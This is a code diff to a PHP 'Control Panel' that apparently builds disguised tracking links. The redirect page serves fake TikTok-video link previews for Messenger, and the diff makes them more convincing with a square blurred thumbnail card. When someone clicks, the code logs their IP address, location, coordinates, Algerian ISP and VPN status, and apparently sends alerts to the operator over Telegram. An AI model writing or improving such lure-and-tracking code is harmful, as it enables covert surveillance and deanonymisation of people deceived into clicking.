@@ -9,7 +9,7 @@ set_time_limit(0);
 session_start();
 
 // ==============================================================================
-// 🖼️ وسيط الصور (Image Proxy) - يعرض الصورة الأصلية العمودية
+// 🖼️ مولد الصور الاحترافي (مربع 1:1 مع خلفية مموهة + الصورة الأصلية في المنتصف)
 // ==============================================================================
 if (isset($_GET['proxy_img'])) {
     $img_url = base64_decode($_GET['proxy_img']);
@@ -19,19 +19,48 @@ if (isset($_GET['proxy_img'])) {
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_TIMEOUT, 8);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
     $image_data = curl_exec($ch);
-    $content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
     curl_close($ch);
 
-    if ($image_data) {
-        header("Content-Type: " . ($content_type ?: 'image/jpeg'));
-        header("Cache-Control: public, max-age=86400");
-        echo $image_data;
-        exit;
+    if ($image_data && function_exists('imagecreatefromstring')) {
+        $src = @imagecreatefromstring($image_data);
+        if ($src) {
+            $w = imagesx($src); $h = imagesy($src); $target_size = 800; // حجم مربع احترافي
+            
+            $dst = imagecreatetruecolor($target_size, $target_size);
+            $bg = imagecreatetruecolor($target_size, $target_size);
+            
+            // 1. إنشاء الخلفية المموهة
+            $scale = max($target_size / $w, $target_size / $h);
+            $new_w = $w * $scale; $new_h = $h * $scale;
+            $x = ($target_size - $new_w) / 2; $y = ($target_size - $new_h) / 2;
+            imagecopyresampled($bg, $src, $x, $y, 0, 0, $new_w, $new_h, $w, $h);
+            
+            // تمويه وتغميق الخلفية
+            for ($i = 0; $i < 15; $i++) { imagefilter($bg, IMG_FILTER_GAUSSIAN_BLUR); }
+            imagefilter($bg, IMG_FILTER_BRIGHTNESS, -60);
+
+            // 2. وضع الصورة الأصلية في المنتصف (لتكون بارزة)
+            $scale_center = $target_size / $h; 
+            $new_w_center = $w * $scale_center; 
+            $new_h_center = $target_size;
+            $x_center = ($target_size - $new_w_center) / 2; 
+            $y_center = 0;
+
+            imagecopyresampled($dst, $bg, 0, 0, 0, 0, $target_size, $target_size, $target_size, $target_size);
+            imagecopyresampled($dst, $src, $x_center, $y_center, 0, 0, $new_w_center, $new_h_center, $w, $h);
+
+            header('Content-Type: image/jpeg'); 
+            header("Cache-Control: public, max-age=86400");
+            imagejpeg($dst, null, 90);
+            imagedestroy($src); imagedestroy($bg); imagedestroy($dst);
+            exit;
+        }
     }
-    // صورة بديلة (فقط في حال انقطع الاتصال بتيك توك تماماً)
-    header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=720&h=1280&fit=crop"); 
+    // إذا فشل تحميل الصورة الأصلية، نعرض الصورة كما هي
+    if ($image_data) { header('Content-Type: image/jpeg'); echo $image_data; exit; }
+    header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=800&h=800&fit=crop"); 
     exit;
 }
 
@@ -114,53 +143,41 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// ✅ دالة محسنة جداً لاستخراج الاسم والصورة الحقيقية (تقرأ البيانات الخفية داخل تيك توك)
+// دالة محسنة جداً لاستخراج الاسم الحقيقي 100%
 function fetch_tiktok_exclusive_meta($url) {
     $meta = ['title' => 'فيديو تيك توك', 'image' => ''];
     
-    // المحاولة 1: oEmbed API
+    // 1. oEmbed (سريع)
     $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_CONNECTTIMEOUT => 3,
-        CURLOPT_ENCODING => "", CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
-    ]);
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_CONNECTTIMEOUT => 3, CURLOPT_ENCODING => "", CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0']);
     $response = curl_exec($ch); curl_close($ch);
     if ($response) {
         $data = json_decode($response, true);
         if (!empty($data['title']) && !empty($data['thumbnail_url'])) {
-            $title = $data['title'];
-            if (stripos($title, 'Make Your Day') !== false) $title = 'فيديو تيك توك';
-            return ['title' => $title, 'image' => $data['thumbnail_url']];
+            return ['title' => $data['title'], 'image' => $data['thumbnail_url']];
         }
     }
     
-    // المحاولة 2: سحب الصفحة وتفتيش الـ JSON المخفي (أقوى طريقة)
+    // 2. استخراج من صفحة الويب (عنيد جداً)
     $ch = curl_init($url);
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3,
-        CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
-    ]);
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3, CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)']);
     $html = curl_exec($ch); curl_close($ch);
     
     if ($html) {
-        // استخراج العنوان من البيانات الخفية
+        // جلب العنوان
         if (preg_match('/"desc":"([^"]+)"/', $html, $matches)) {
             $meta['title'] = html_entity_decode(stripslashes($matches[1]), ENT_QUOTES, 'UTF-8');
         } elseif (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
             $meta['title'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
             if (stripos($meta['title'], 'Make Your Day') !== false) $meta['title'] = 'فيديو تيك توك';
         }
-        
-        // استخراج الصورة من البيانات الخفية
+        // جلب الصورة
         if (preg_match('/"cover":"([^"]+)"/', $html, $matches)) {
             $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
         } elseif (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
             $meta['image'] = $matches[1];
         }
     }
-    
     return $meta;
 }
 
@@ -172,7 +189,7 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-// ✅ تحديد المتعامل بدقة (يبحث عن الكلمات المفتاحية مهما كان الاسم)
+// ✅ تحديد المتعامل بدقة
 function get_ip_details($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
@@ -186,15 +203,11 @@ function get_ip_details($ip) {
             $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
             $raw_isp = strtolower($data['isp'] ?? '');
             
-            // مطابقة دقيقة لمزودي الخدمة في الجزائر
             if (strpos($raw_isp, 'djezzy') !== false || strpos($raw_isp, 'ota') !== false) $isp = 'Djezzy 🇩🇿';
             elseif (strpos($raw_isp, 'mobilis') !== false || strpos($raw_isp, 'atm') !== false) $isp = 'Mobilis 🇩🇿';
             elseif (strpos($raw_isp, 'ooredoo') !== false || strpos($raw_isp, 'wataniya') !== false || strpos($raw_isp, 'nedjma') !== false) $isp = 'Ooredoo 🇩🇿';
             elseif (strpos($raw_isp, 'algerie telecom') !== false || strpos($raw_isp, 'algérie télécom') !== false) $isp = 'Algérie Télécom 🇩🇿';
             elseif (strpos($raw_isp, 'optimum') !== false) $isp = 'Optimum Telecom 🇩🇿';
-            elseif (strpos($raw_isp, 'icosnet') !== false) $isp = 'Icosnet 🇩🇿';
-            elseif (strpos($raw_isp, 'smart') !== false) $isp = 'Smart 🇩🇿';
-            elseif (strpos($raw_isp, 'lacom') !== false) $isp = 'Lacom 🇩🇿';
             else $isp = ucwords($data['isp'] ?? 'Unknown ISP');
 
             $vpn = (!empty($data['proxy']) || !empty($data['hosting'])) ? 'Yes (VPN / Proxy)' : 'No (Direct)';
@@ -246,8 +259,9 @@ if (isset($_GET['r'])) {
             echo '<meta property="og:description" content="شاهد الفيديو الآن">';
             echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
-            echo '<meta property="og:image:width" content="720">';
-            echo '<meta property="og:image:height" content="1280">';
+            // استخدام أبعاد مربعة (1:1) لجعل ماسنجر يعرضها كبطاقة فيديو احترافية
+            echo '<meta property="og:image:width" content="800">';
+            echo '<meta property="og:image:height" content="800">';
             echo '<meta property="og:type" content="video.other">';
             echo '</head><body></body></html>';
             exit();
@@ -631,7 +645,7 @@ if ($is_logged_in) {
         <aside class="sidebar">
             <div class="sidebar-header">
                 <h2>Control Panel</h2>
-                <p>Aziz Edition V20</p>
+                <p>Aziz Edition V21</p>
             </div>
             
             <button class="nav-item active" onclick="switchTab('home')">🏠 الرئيسية</button>
